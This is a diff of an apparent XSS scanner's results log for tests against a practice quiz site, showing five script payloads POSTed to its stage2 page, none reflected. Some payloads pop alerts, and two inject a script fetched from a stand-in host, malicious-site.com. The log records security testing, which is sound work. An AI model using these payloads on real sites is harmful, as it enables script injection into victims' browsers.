@@ -1,11 +1,32 @@
-Total XSS Attempts: 1
-Total Successful XSS Attempts: 1
-Total Failed XSS Attempts: 0
 
---- Analyzed Results ---
+🔎 XSS Payload Analysis Summary:
+--------------------------------
+Total Payloads Tested : 5
+Payloads Reflected    : 0
+Payloads Not Reflected: 5
 
-URL: https://xss-quiz.int21h.jp/?sid=cfb6c997fc170746761dda3e16f2062c6f5efd32/?sid=5ea18a83d86914179f91e4481c4421c2c1dd0896
-Payload: <script>alert('XSS')</script>
-Status: 200
-XSS Successful: Yes
---------------------------------------------------
+Reflected Payloads:
+-------------------------
+
+
+Not Reflected Payloads:
+-------------------------
+-  Payload URL: POST to https://xss-quiz.int21h.jp/stage2.php?sid=06715bc9989e6de1633b28090a0363d7d496822e | body: p1=%7B%27payload%27%3A+%22%3Cscript%3Evar+n%3Ddocument.createElement%28%27input%27%29%3Bn.setAttribute%28%27oninput%27%2C%27alert%281%29%27%29%3Bdocument.body.appendChild%28n%29%3B%3C%2Fscript%3E%22%7D
+   Payload: <script>var n=document.createElement('input');n.setAttribute('oninput','alert(1)');document.body.appendChild(n);</script>
+   URL: https://xss-quiz.int21h.jp/stage2.php?sid=06715bc9989e6de1633b28090a0363d7d496822e
+
+-  Payload URL: POST to https://xss-quiz.int21h.jp/stage2.php?sid=06715bc9989e6de1633b28090a0363d7d496822e | body: p1=%7B%27payload%27%3A+%27%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E%27%7D
+   Payload: <script>alert(document.domain);</script>
+   URL: https://xss-quiz.int21h.jp/stage2.php?sid=06715bc9989e6de1633b28090a0363d7d496822e
+
+-  Payload URL: POST to https://xss-quiz.int21h.jp/stage2.php?sid=06715bc9989e6de1633b28090a0363d7d496822e | body: p1=%7B%27payload%27%3A+%22%3Cscript%3Evar+s%3Ddocument.createElement%28%27script%27%29%3Bs.src%3D%27https%3A%2F%2Fmalicious-site.com%2Fxss.js%27%3Bdocument.body.appendChild%28s%29%3B%3C%2Fscript%3E%22%7D
+   Payload: <script>var s=document.createElement('script');s.src='https://malicious-site.com/xss.js';document.body.appendChild(s);</script>
+   URL: https://xss-quiz.int21h.jp/stage2.php?sid=06715bc9989e6de1633b28090a0363d7d496822e
+
+-  Payload URL: POST to https://xss-quiz.int21h.jp/stage2.php?sid=06715bc9989e6de1633b28090a0363d7d496822e | body: p1=%7B%27payload%27%3A+%22%3Cscript%3Edocument.write%28%27%3Cimg+src%3Dx+onerror%3Dalert%281%29+%2F%3E%27%29%3B%3C%2Fscript%3E%22%7D
+   Payload: <script>document.write('<img src=x onerror=alert(1) />');</script>
+   URL: https://xss-quiz.int21h.jp/stage2.php?sid=06715bc9989e6de1633b28090a0363d7d496822e
+
+-  Payload URL: POST to https://xss-quiz.int21h.jp/stage2.php?sid=06715bc9989e6de1633b28090a0363d7d496822e | body: p1=%7B%27payload%27%3A+%22%3Cscript+src%3D%27https%3A%2F%2Fmalicious-site.com%2Fxss.js%27%3E%3C%2Fscript%3E%22%7D
+   Payload: <script src='https://malicious-site.com/xss.js'></script>
+   URL: https://xss-quiz.int21h.jp/stage2.php?sid=06715bc9989e6de1633b28090a0363d7d496822e
